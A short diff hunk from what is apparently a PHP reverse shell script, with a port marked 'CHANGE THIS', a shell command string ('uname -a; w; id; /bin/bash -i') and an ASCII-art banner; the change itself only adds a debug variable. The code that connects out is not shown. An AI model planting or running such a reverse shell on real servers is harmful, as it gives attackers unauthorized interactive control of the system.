@@ -7,6 +7,7 @@ $port = 444;       // CHANGE THIS
 $chunk_size = 1400;
 $shell = 'uname -a; w; id; /bin/bash -i';
 $contador = 0;
+$debug = 0;
 $welcome_message = "  \033[1;34m_____   _   _   _____   _   _   _  __  _____   
  / ____| | | | | |_   _| | \ | | | |/ / |_   _|  
 | (___   | |_| |   | |   |  \| | | ' /    | |    
